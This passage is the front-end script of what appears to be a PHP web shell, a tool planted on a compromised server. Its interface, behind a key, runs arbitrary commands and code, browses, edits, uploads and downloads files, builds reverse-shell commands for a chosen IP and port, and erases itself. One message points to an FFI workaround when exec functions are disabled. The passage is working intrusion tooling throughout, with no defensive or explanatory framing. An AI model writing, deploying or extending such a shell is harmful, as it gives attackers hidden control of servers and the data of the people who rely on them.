  print('<span class="err">[!] no exec primitive, but FFI is available behind ffi.enable=preload.</span>');
  print('<span class="dim">    armed: ' + esc(boot.ffi_armed) + ' — RELOAD this page to activate the FFI runner.</span>');
}

async function exec(cmd) {
  print('<span class="cmd">$ ' + esc(cmd) + '</span>');
  const t0 = performance.now();
  const r = await api('exec', {cmd});
  const ms = Math.round(performance.now() - t0);
  if (r.out) print('<span class="out">' + esc(r.out) + '</span>');
  if (r.err) print('<span class="err">' + esc(r.err) + '</span>');
  document.getElementById('st-last').textContent = 'last: ' + ms + 'ms · ' + (r.strategy || '?');
  document.getElementById('st-cwd').textContent = r.cwd || '';
}

cin.addEventListener('keydown', async e => {
  if (e.key === 'Enter') {
    const v = cin.value.trim();
    cin.value = '';
    if (!v) return;
    hist.push(v); hi = hist.length;
    if (v === 'clear') { term.innerHTML = ''; return; }
    if (v === 'help') {
      print('<span class="dim">builtin: clear, help, cd DIR, pwd, info</span>');
      return;
    }
    if (v.startsWith('cd ')) {
      const r = await api('cwd', {dir: v.slice(3).trim()});
      if (r.cwd) {
        boot.cwd = r.cwd;
        document.getElementById('st-cwd').textContent = r.cwd;
        document.getElementById('ps1').textContent = '$';
        document.getElementById('i-cwd').textContent = r.cwd;
      }
      return;
    }
    if (v === 'pwd') { print('<span class="out">' + esc(boot.cwd) + '</span>'); return; }
    if (v === 'info') { Sys.info(); return; }
    exec(v);
  } else if (e.key === 'ArrowUp') {
    e.preventDefault(); if (hi > 0) cin.value = hist[--hi];
  } else if (e.key === 'ArrowDown') {
    e.preventDefault(); if (hi < hist.length - 1) cin.value = hist[++hi]; else { hi = hist.length; cin.value = ''; }
  }
});

/* ---- files ---- */
const Files = {
  dir: boot.cwd, cur: '',
  async go(p) {
    const r = await api('ls', {dir: p});
    if (!r.ok) { print('<span class="err">' + esc(r.msg) + '</span>'); return; }
    this.dir = r.dir;
    document.getElementById('fdir').value = r.dir;
    const tb = document.getElementById('ftbody');
    tb.innerHTML = '';
    const mk = (name, type, size, perm, extra) => {
      const tr = document.createElement('tr');
      tr.innerHTML = '<td class="nm' + (type === 'dir' ? ' dir' : '') + '">' + (type === 'dir' ? '▸ ' : '· ') + esc(name) + '</td>' +
                     '<td class="sz">' + (type === 'dir' ? '' : size) + '</td>' +
                     '<td class="pm">' + (perm || '') + '</td>';
      tr.onclick = () => {
        const full = r.dir.replace(/\/$/, '') + '/' + name;
        if (type === 'dir') this.go(full); else this.open(full);
      };
      tb.appendChild(tr);
    };
    r.items.sort((a, b) => (a.type === 'dir' ? -1 : 1) - (b.type === 'dir' ? -1 : 1) || a.name.localeCompare(b.name))
      .forEach(i => mk(i.name, i.type, i.size, i.perm));
  },
  up() { this.go(this.dir.replace(/\/[^/]*\/?$/, '') || '/'); },
  async open(p) {
    this.cur = p;
    const r = await api('read', {path: p});
    document.getElementById('fname').textContent = p;
    document.getElementById('fbody').value = r.ok ? atob(r.data) : '(!) ' + r.msg;
  },
  async save() {
    if (!this.cur) return;
    const r = await api('write', {path: this.cur, data: document.getElementById('fbody').value});
    document.getElementById('fname').textContent = this.cur + (r.ok ? '  [saved ' + r.bytes + 'b]' : '  [FAILED]');
  },
  download() { if (this.cur) location.href = '?k=' + encodeURIComponent(KEY) + '&api=dl&path=' + encodeURIComponent(this.cur); },
  async upload() {
    const f = document.getElementById('fup').files[0];
    if (!f) return;
    const fd = new FormData();
    fd.append('f', f); fd.append('dir', this.dir);
    const r = await fetch('?k=' + encodeURIComponent(KEY) + '&api=up', {method: 'POST', body: fd});
    const j = await r.json();
    print('<span class="dim">upload ' + esc(f.name) + ' → ' + (j.ok ? 'ok' : 'failed') + '</span>');
    this.go(this.dir);
  }
};

/* ---- eval ---- */
const Eval = {
  async go() {
    const code = document.getElementById('ecode').value;
    const r = await api('eval', {code});
    document.getElementById('eout').textContent = (r.out || '') + (r.err ? '\n[ERR] ' + r.err : '');
  }
};

/* ---- reverse shell ---- */
const Rev = {
  async gen() {
    const ip = document.getElementById('rip').value.trim();
    const port = +document.getElementById('rport').value || 4444;
    const lang = document.getElementById('rlang').value;
    const r = await api('revshell', {ip, port, lang});
    document.getElementById('rout').textContent = r.cmd || '';
  }
};

/* ---- system ---- */
const Sys = {
  async info() {
    const r = await api('info');
    document.getElementById('sout').textContent = JSON.stringify(r, null, 2);
  },
  async burn() {
    if (!confirm('delete this file?')) return;
    const r = await api('selfdestruct');
    document.body.innerHTML = '<div style="padding:40px;color:#ff5f57;font-family:monospace">' +
      (r.ok ? 'file removed.' : 'failed.') + '</div>';
  }
};

/* ---- boot ---- */
document.getElementById('i-php').textContent = boot.php;
document.getElementById('i-os').textContent = boot.os;
document.getElementById('i-runner').textContent = boot.runner;
document.getElementById('i-cwd').textContent = boot.cwd;
document.getElementById('st-runner').textContent = 'runner: ' + boot.runner;
document.getElementById('st-cwd').textContent = boot.cwd;
if (boot.disabled && boot.runner === 'none') {
  document.getElementById('i-df').className = 'tag warn';
  document.getElementById('i-df').textContent = 'NO EXEC PRIMITIVE';
}
cin.focus();
</script>
</body>
</html>
